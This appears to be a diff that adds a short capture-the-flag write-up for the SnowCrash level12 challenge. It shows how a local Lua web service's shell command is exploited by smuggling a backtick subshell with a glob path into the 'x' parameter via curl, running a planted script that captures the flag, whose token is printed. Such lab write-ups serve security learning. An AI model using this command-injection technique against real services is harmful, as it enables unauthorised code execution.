@@ -1,0 +1,13 @@
+We found a lua script which runs a server, it listens on the port 4646 on localhost.
+There is a shell command that is ran using a string x.
+This string gets preprocessed using regex, it will be converted to uppercase and everything after whitespace will be removed.
+We can make use of subshell to execute arbitrary code, we just create a script that will run getflag and store its result in /tmp/res, the filename of the script must be uppercase due to the regex translation.
+
+level12@SnowCrash:~$ cat /tmp/KEK
+#!/bin/sh
+getflag > /tmp/res
+
+Then we can simply use curl to make a http request using subshell syntax like such:
+level12@SnowCrash:~$ curl "localhost:4646?x=\`/*/kek\`"
+..level12@SnowCrash:~$ cat /tmp/res
+Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
